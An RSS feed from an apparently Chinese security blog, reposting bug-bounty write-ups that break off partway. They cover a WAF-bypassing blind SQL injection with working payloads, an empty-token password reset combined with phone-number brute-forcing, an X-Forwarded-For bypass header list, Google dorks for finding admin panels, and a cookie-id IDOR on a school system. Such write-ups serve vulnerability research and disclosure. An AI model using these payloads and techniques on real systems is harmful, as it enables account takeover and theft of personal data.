<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>SRC - 标签 - bysec</title>
        <link>http://localhost:1313/tags/src/</link>
        <description>SRC - 标签 - bysec</description>
        <generator>Hugo -- gohugo.io</generator><language>zh-CN</language><managingEditor>bysec@qq.com (bysec)</managingEditor>
            <webMaster>bysec@qq.com (bysec)</webMaster><lastBuildDate>Mon, 02 Sep 2024 20:06:21 &#43;0800</lastBuildDate><atom:link href="http://localhost:1313/tags/src/" rel="self" type="application/rss+xml" /><item>
    <title>比较有意思的几个漏洞挖掘记录</title>
    <link>http://localhost:1313/%E6%AF%94%E8%BE%83%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%AE%B0%E5%BD%95/</link>
    <pubDate>Mon, 02 Sep 2024 20:06:21 &#43;0800</pubDate><author>
        <name>bysec</name>
    </author><guid>http://localhost:1313/%E6%AF%94%E8%BE%83%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%AE%B0%E5%BD%95/</guid>
    <description><![CDATA[<blockquote>
<p><em>转载自： <a href="https://forum.butian.net/share/3692" target="_blank" rel="noopener noreferrer">https://forum.butian.net/share/3692</a></em></p>
</blockquote>
<h2 id="sql-注入" class="headerLink">
    <a href="#sql-%e6%b3%a8%e5%85%a5" class="header-mark"></a>sql 注入</h2><p>某条数据，点击详情的数据包，单引号报错</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000003rXNGz44bsvx.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000003rXNGz44bsvx.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000003rXNGz44bsvx.jpg">
        
    </a></p>
<p>再加一个正常</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002BarUQ0ybWXS.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002BarUQ0ybWXS.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002BarUQ0ybWXS.jpg">
        
    </a></p>
<p>本以为是一次平平无奇的 sql 注入，没想到绕了一天才绕过去，下面放几张测试失败的截图</p>
<p>首先就是 404，不知道规则是啥样的，下面语句应该是没问题的就会 404,1=1 让语句不通就会 500</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000000H0iRX1RkzrQ.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000000H0iRX1RkzrQ.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000000H0iRX1RkzrQ.jpg">
        
    </a></p>
<p>试了下 orcale 的注入方法，又爆 403，这里&rsquo;||55||&lsquo;会返回空数据，&rsquo;||1/0||&lsquo;会爆 500，这里判断语句能想到的都试了，全 403，最奇怪的是只有语句正确才会 403，少写一个 D 就会 500，不知道这什么匹配逻辑，不过试了一些插入空白字符啥的也都不行</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000001EyJVU4M7d9w.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000001EyJVU4M7d9w.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000001EyJVU4M7d9w.jpg">
        
    </a></p>
<p>这里我又跑了一遍字典，全 404、500、403，期间尝试结合分块传输、参数污染、垃圾数据、白名单、高并发均未绕过去</p>
<p>最终经过我的不断测试,插入下面 payload 回显特别慢，最终显示数据量太大，不过 in 这个关键字我理解的不是很透彻，有懂的师傅可以解答下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39;OR+1+in+1+and+&#39;</span><span class="n">a</span><span class="s1">&#39;+in+&#39;</span><span class="n">a</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000001dwmNm2rXlXN.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000001dwmNm2rXlXN.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000001dwmNm2rXlXN.jpg">
        
    </a></p>
<p>当 1 in 5 的时候整个结果为 false，返回为空</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000004ZPgVY20eA1I.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000004ZPgVY20eA1I.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000004ZPgVY20eA1I.jpg">
        
    </a></p>
<p>直接注下 user 的长度</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39;OR+1+in+length(user)+and+&#39;</span><span class="n">a</span><span class="s1">&#39;+in+&#39;</span><span class="n">a</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>只有相等时会卡死，很明显为 7 位</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD0000048Po2b3Ql45D.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD0000048Po2b3Ql45D.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD0000048Po2b3Ql45D.jpg">
        
    </a></p>
<p>直接用 instr 函数注用户名</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39;OR+1+in+instr(user,&#39;</span><span class="n">u</span><span class="s1">&#39;)+and+&#39;</span><span class="n">a</span><span class="s1">&#39;+in+&#39;</span><span class="n">a</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">instr函数代表后面那个字符在前面字符串第一次出现的位置</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">例如</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">instr</span><span class="p">(</span><span class="s1">&#39;user&#39;</span><span class="p">,</span><span class="s1">&#39;u&#39;</span><span class="p">)</span><span class="err">返回</span><span class="mi">1</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">instr</span><span class="p">(</span><span class="s1">&#39;user&#39;</span><span class="p">,</span><span class="s1">&#39;us&#39;</span><span class="p">)</span><span class="err">返回</span><span class="mi">1</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">instr</span><span class="p">(</span><span class="s1">&#39;user&#39;</span><span class="p">,</span><span class="s1">&#39;s&#39;</span><span class="p">)</span><span class="err">返回</span><span class="mi">2</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>第一位为 S</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000001CPCnX1aMs9v.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000001CPCnX1aMs9v.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000001CPCnX1aMs9v.jpg">
        
    </a></p>
<p>第二位为 H，其他同理</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000004RCF7U0ZYhuT.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000004RCF7U0ZYhuT.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000004RCF7U0ZYhuT.jpg">
        
    </a></p>
<h2 id="任意用户名密码重置" class="headerLink">
    <a href="#%e4%bb%bb%e6%84%8f%e7%94%a8%e6%88%b7%e5%90%8d%e5%af%86%e7%a0%81%e9%87%8d%e7%bd%ae" class="header-mark"></a>任意用户名密码重置</h2><p>玩的某个游戏，手机号换了，申诉成功给我发了邮件，可以看到 id 和 token</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD0000022NIzr3Xknhj.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD0000022NIzr3Xknhj.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD0000022NIzr3Xknhj.jpg">
        
    </a></p>
<p>这里直接更换 id 访问，进行更改密码，显示错误</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000000Nracm06DynJ.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000000Nracm06DynJ.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000000Nracm06DynJ.jpg">
        
    </a></p>
<p>简单测了测，id 随便改，token 为空</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000001L2Gra0U5QK6.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000001L2Gra0U5QK6.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000001L2Gra0U5QK6.jpg">
        
    </a></p>
<p>直接修改密码成功</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000004B32j60yX756.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000004B32j60yX756.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000004B32j60yX756.jpg">
        
    </a></p>
<p>这里因为不知道目标账号的 id，只能随机修改，因为手机号基本就跟 id 绑定，于是找到了申诉的功能点，这里输入手机号</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002ekgBI45PqUV.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002ekgBI45PqUV.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002ekgBI45PqUV.jpg">
        
    </a></p>
<p>可以看到返回了 id</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002chTo30nRcBj.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002chTo30nRcBj.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002chTo30nRcBj.jpg">
        
    </a></p>
<p>下一步就是要知道目标的手机号，经过我的不懈寻找，在游戏 app 的登录界面，有个忘记账号功能</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD0000014diLm1AT8Mj.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD0000014diLm1AT8Mj.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD0000014diLm1AT8Mj.jpg">
        
    </a></p>
<p>这里输入手机号或者游戏的 uid 就可以看到一些信息</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002GwmN40rErNQ.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002GwmN40rErNQ.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002GwmN40rErNQ.jpg">
        
    </a></p>
<p>这里游戏 uid 是公开的，资料就能看到，不过手机号只有前三位和后四位</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000001BFWD22gVzfn.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000001BFWD22gVzfn.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000001BFWD22gVzfn.jpg">
        
    </a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000000P4nBF3GimRu.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000000P4nBF3GimRu.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000000P4nBF3GimRu.jpg">
        
    </a></p>
<p>在官网找回密码处，这里输入手机号抓个包</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002nVUxc3lw5v1.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002nVUxc3lw5v1.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002nVUxc3lw5v1.jpg">
        
    </a></p>
<p>输入不对的手机号会提示错误，因为我们知道前三位还有后四位，爆破起来还是很快的</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000001XG0k32y0x2i.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000001XG0k32y0x2i.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000001XG0k32y0x2i.jpg">
        
    </a></p>
<p>最后只得到几个真实存在的手机号，这时候就可以去游戏 app 登陆界面去对比，手机号正确的话，返回的 UID 是一样的，这里也可以抓包写个脚本去判断，因为真实存在手机号就几个，我就直接手动尝试的</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000003U8hXT0WrH3b.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000003U8hXT0WrH3b.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000003U8hXT0WrH3b.jpg">
        
    </a></p>
<p>确定了目标手机号就知道了 id，就可以想修改谁的密码就可以修改谁的了</p>
<h2 id="某站测试记录" class="headerLink">
    <a href="#%e6%9f%90%e7%ab%99%e6%b5%8b%e8%af%95%e8%ae%b0%e5%bd%95" class="header-mark"></a>某站测试记录</h2><p>目标站主域名有两个，a 和 b 代替 ，这里主要目标是 a，b 应该是以前用的，首先是爆破出来了两个 demo 站 demo.atest.com 和 demo.btest.com<br>
会提示 ip 无法访问，访问 demo.btest.com</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD0000009JGzK3pj5H2.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD0000009JGzK3pj5H2.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD0000009JGzK3pj5H2.jpg">
        
    </a></p>
<p>另外一个也一样</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000003BR4LX0qPPPj.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000003BR4LX0qPPPj.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000003BR4LX0qPPPj.jpg">
        
    </a></p>
<p>这里直接插 xff 头绕过的</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">X-Forwarded-For: 127.0.0.1
</span></span><span class="line"><span class="cl">X-Forwarded:127.0.0.1
</span></span><span class="line"><span class="cl">Forwarded-For:127.0.0.1
</span></span><span class="line"><span class="cl">Forwarded:127.0.0.1
</span></span><span class="line"><span class="cl">X-Requested-With:127.0.0.1
</span></span><span class="line"><span class="cl">X-Forwarded-Proto:127.0.0.1
</span></span><span class="line"><span class="cl">X-Forwarded-Host:127.0.0.1
</span></span><span class="line"><span class="cl">X-remote-lP:127.0.0.1
</span></span><span class="line"><span class="cl">X-remote-addr:127.0.0.1
</span></span><span class="line"><span class="cl">True-Client-lP: 127.0.0.1
</span></span><span class="line"><span class="cl">X-Client-lP:127.0.0.1
</span></span><span class="line"><span class="cl">Client-lP: 127.0.0.1
</span></span><span class="line"><span class="cl">X-Real-IP:127.0.0.1
</span></span><span class="line"><span class="cl">Ali-CDN-Real-IP:127.0.0.1
</span></span><span class="line"><span class="cl">Cdn-Src-lp:127.0.0.1
</span></span><span class="line"><span class="cl">Cdn-Real-lp:127.0.0.1
</span></span><span class="line"><span class="cl">CF-Connecting-lP:127.0.0.1
</span></span><span class="line"><span class="cl">X-Cluster-Client-lP:127.0.0.1
</span></span><span class="line"><span class="cl">WL-Proxy-Client-lP:127.0.0.1
</span></span><span class="line"><span class="cl">Proxy-Client-lP:127.0.0.1
</span></span><span class="line"><span class="cl">Fastly-Client-lp: 127.0.0.1
</span></span><span class="line"><span class="cl">True-Client-lp: 127.0.0.1
</span></span><span class="line"><span class="cl">X-Originating-lP:127.0.0.1
</span></span><span class="line"><span class="cl">X-Host: 127.0.0.1
</span></span><span class="line"><span class="cl">X-Custom-lP-Authorization:127.0.0.1
</span></span></code></pre></td></tr></table>
</div>
</div><p>这里是创建订单成功了，返回了一个地址，<a href="https://cashier.xxxx.xxxx/" target="_blank" rel="noopener noreferrer">https://cashier.xxxx.xxxx</a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000003OKvKf04npVW.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000003OKvKf04npVW.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000003OKvKf04npVW.jpg">
        
    </a></p>
<p>访问之后</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000001vSSks0T63Sb.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000001vSSks0T63Sb.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000001vSSks0T63Sb.jpg">
        
    </a></p>
<p>因为这是订单信息，所以我猜测前面子域名是后台的</p>
<p>构造<a href="https://cashier.atest.com/" target="_blank" rel="noopener noreferrer">https://cashier.atest.com</a> 访问之后 401，添加 xff 头直接访问</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000000pMc650B4Prl.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000000pMc650B4Prl.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000000pMc650B4Prl.jpg">
        
    </a></p>
<p>这里 a 网站应该也是一样的规则</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000001ZfEfq0RU43V.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000001ZfEfq0RU43V.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000001ZfEfq0RU43V.jpg">
        
    </a></p>
<p>因为是测试后台，这里直接将 test 删除，访问<a href="https://cashier.a.com/" target="_blank" rel="noopener noreferrer">https://cashier.a.com</a> 显示无法访问，修改 xff 头仍然失败</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00000315og20v7wv3.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00000315og20v7wv3.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00000315og20v7wv3.jpg">
        
    </a></p>
<p>只能从测试站入手了，首先是爆破出来了用户密码，但是却无法登录，不过返回了 token，这里前端看到了 webpack 的接口信息</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000000Hrh3G1Q5V6Q.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000000Hrh3G1Q5V6Q.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000000Hrh3G1Q5V6Q.jpg">
        
    </a></p>
<p>在 JS 存在好多接口和接口配置包的构造并且还有 API 路径</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000000pFIMZ070KsU.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000000pFIMZ070KsU.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000000pFIMZ070KsU.jpg">
        
    </a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000004ZXWYi1vCfA4.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000004ZXWYi1vCfA4.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000004ZXWYi1vCfA4.jpg">
        
    </a></p>
<p>抓个登录接口的包看下格式拼接就好</p>
<p>有的接口有未授权，有的接口需要权限，但是爆破成功的数据包里面是有返回 token 的，于是带着这个 token 访问就可以了，但是均为测试站点的数据</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00000217WUA36HCUk.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00000217WUA36HCUk.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00000217WUA36HCUk.jpg">
        
    </a></p>
<p>于是猜测管理后台地址也是有这些接口的，直接更换请求的 host，成功获取到真实数据</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002h573Y0i3m9L.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002h573Y0i3m9L.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002h573Y0i3m9L.jpg">
        
    </a></p>]]></description>
</item><item>
    <title>一次经典教育系统后台漏洞打包</title>
    <link>http://localhost:1313/%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%85%B8%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E6%89%93%E5%8C%85/</link>
    <pubDate>Mon, 02 Sep 2024 18:34:17 &#43;0800</pubDate><author>
        <name>bysec</name>
    </author><guid>http://localhost:1313/%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%85%B8%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E6%89%93%E5%8C%85/</guid>
    <description><![CDATA[<blockquote>
<p><em>转载自： <a href="https://forum.butian.net/share/3693" target="_blank" rel="noopener noreferrer">https://forum.butian.net/share/3693</a></em></p>
</blockquote>
<h2 id="记一次经典教育系统后台漏洞打包" class="headerLink">
    <a href="#%e8%ae%b0%e4%b8%80%e6%ac%a1%e7%bb%8f%e5%85%b8%e6%95%99%e8%82%b2%e7%b3%bb%e7%bb%9f%e5%90%8e%e5%8f%b0%e6%bc%8f%e6%b4%9e%e6%89%93%e5%8c%85" class="header-mark"></a>记:一次经典教育系统后台漏洞打包!</h2><h2 id="前言" class="headerLink">
    <a href="#%e5%89%8d%e8%a8%80" class="header-mark"></a>前言:</h2><p>小编认为像什么什么大学比较显眼的 &ldquo;统一认证登录&rdquo;||&ldquo;学生综合管理&rdquo;,基本上弱口令是不太行,别的漏洞的话好多也都被大佬们打完了或者利用上不太容易(菜鸟的内心崩塌)，对于自己渗透能力的有限，信息收集就尤为重要! 既然主站打不了，就打旁站吧！（基本的方式都是通用的） 这里先分享一下<strong>小编自用的谷歌语法：谷歌语法基础的符号：</strong> “xxx”: 将要搜索的关键字用引号括起来 (表示完全匹配，即关键词不能分开，顺序也不能变)</p>
<p>例如：腾讯课堂如果不加“ ”的话，就会针对腾讯和课堂进行拆分，既对腾讯进行搜索也对课堂进行搜索，所以加上“ ”的话就会对腾讯课堂进行绑定，只对腾讯课堂进行搜索</p>
<p>+：“xxx” +baidu.com</p>
<p>搜索 xxx 与 baidu.com 相关的内容</p>
<p>例如：腾讯课堂 +ke.qq.com，那么这里就会显示 ke.qq.com 相关的内容</p>
<p>-：“xxx” -baidu.com</p>
<p>搜索结果里面除去 baidu.com 相关的内容</p>
<p>例如：腾讯课堂 -ke.qq.com，这里再搜索的时候，就会把这个网址屏蔽掉</p>
<p>谷歌语法的基础使用 在渗透测试的过程中，运用谷歌语法能快速地帮我们找到可能存在漏洞的页面</p>
<p>谷歌语法常用搜索参数： site： 指定域名，如：site:edu.cn 搜索教育网站</p>
<p>inurl： 用于搜索包含的 url 关键词的网页，如：inurl:uploads 文件上传，搜索关于公司有关的网址中含有 login 的网页，</p>
<p>intitle： 搜索网页标题中的关键字，如：</p>
<p>intitle:“index of /admin” robots.txt</p>
<p>intitle:“robots.txt”</p>
<p>intext： 搜索网页正文中的关键字，如：intext:登陆/注册/用户名/密码</p>
<p>filetype： 按指定文件类型即文件后缀名搜索，如：filetpye:php/asp/jsp</p>
<p>cache： 已经删除的缓存网页，推荐组合使用</p>
<p><strong>谷歌语法拓展</strong> <strong>查找后台</strong> site:xx.com intext:管理|后台|登陆|用户名|密码|系统|帐号|admin|login|sys|managetem|password|username</p>
<p>site:xx.com inurl:login|admin|manage|member|admin_login|login_admin|system|login|user</p>
<p><strong>查找 sql 注入漏洞</strong> inurl:.php?id=23 公司</p>
<p>inurl:.asp?id=11</p>
<p><strong>查找上传点：</strong> site:xx.com inurl:file| uploadfile</p>
<p><strong>查找敏感信息泄露</strong> intitle:“Index of /admin”</p>
<p>intitle:“Index of /root”</p>
<p>intitle:“Index of /” +password.txt</p>
<p>intitle:phpinfo()或者 inurl:phpinfo.php</p>
<p><strong>查找未授权访问</strong>phpmyadmin inurl:.php? intext:CHARACTER_SETS,COLLATIONS, ?intitle:phpmyadmin</p>
<p><strong>这次案例就是</strong>：site:xxx.edu.cn “管理登录”||“登录”||“用户登录” 由于一次意外经历，意外获得该学校的秘密规律（方式有且不限于用户手册/小程序），所以是一场有针对性的后台登录</p>
<h2 id="某实践教学毕设管理平台" class="headerLink">
    <a href="#%e6%9f%90%e5%ae%9e%e8%b7%b5%e6%95%99%e5%ad%a6%e6%af%95%e8%ae%be%e7%ae%a1%e7%90%86%e5%b9%b3%e5%8f%b0" class="header-mark"></a>某实践教学毕设管理平台</h2><p>像这一种一眼二开的老旧学校管理系统，就感觉有戏，不出所料利用收集到的密码规律也是成功登陆了</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002lBSz93HGtv2.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002lBSz93HGtv2.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002lBSz93HGtv2.jpg">
        
    </a></p>
<h3 id="信息泄露" class="headerLink">
    <a href="#%e4%bf%a1%e6%81%af%e6%b3%84%e9%9c%b2" class="header-mark"></a>信息泄露</h3><p>进来直接就给了惊喜（<strong>学生账号也能看到同学和老师</strong>）个人感觉这种毕设学校都是这样整的</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD0000021e8Ox0nNje7.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD0000021e8Ox0nNje7.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD0000021e8Ox0nNje7.jpg">
        
    </a><br>
直接发现大量学号规律，已经算是信息泄露了，但是都进来了哪有那么容易走， 于是开始用自己三脚猫功夫&ndash;再加上又有学号规律，可以试试越权咯！</p>
<h3 id="越权测试" class="headerLink">
    <a href="#%e8%b6%8a%e6%9d%83%e6%b5%8b%e8%af%95" class="header-mark"></a>越权测试</h3><p>翻了翻功能点发现有个修改密码，哎！好像这类一般有越权修改密码哦！开搞</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000000vxZf82X8dIg.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000000vxZf82X8dIg.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000000vxZf82X8dIg.jpg">
        
    </a><br>
点击修改密码抓包：</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002szITk3Su3Hb.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002szITk3Su3Hb.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002szITk3Su3Hb.jpg">
        
    </a><br>
发现可以修改的参数都在 cookie 里面： ASP.NET_SessionId 这一看就是加密签名咯（能力有限留给逆向大佬） OA_User=id=54598 （感觉跟用户 id 有关系） unumber 和 ip 分别是用户名和 IP 地址（感觉也没法改） Powerid= 6 (这个个位数参数猜测是权限上面的）</p>
<h5 id="注意" class="headerLink">
    <a href="#%e6%b3%a8%e6%84%8f" class="header-mark"></a>（注意）</h5><p><strong>这里面我在每一次点击功能点时会连续抓取 4~5 个包，为了达成越权目的必须确保每一个数据包都进行修改！！</strong></p>
<p>尝试修改 OA_User=id= 54597 （先减一位然后再减一位）</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002ghYh04dk5sh.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002ghYh04dk5sh.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002ghYh04dk5sh.jpg">
        
    </a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002ykNRs0oJibw.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002ykNRs0oJibw.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002ykNRs0oJibw.jpg">
        
    </a><br>
发现对应的用户名也是对应着改变，（只是不和 id 匹配）</p>
<p>哎！这不就是直接可以越权修改密码！水平越权有了！</p>
<h4 id="扩展垂直越权" class="headerLink">
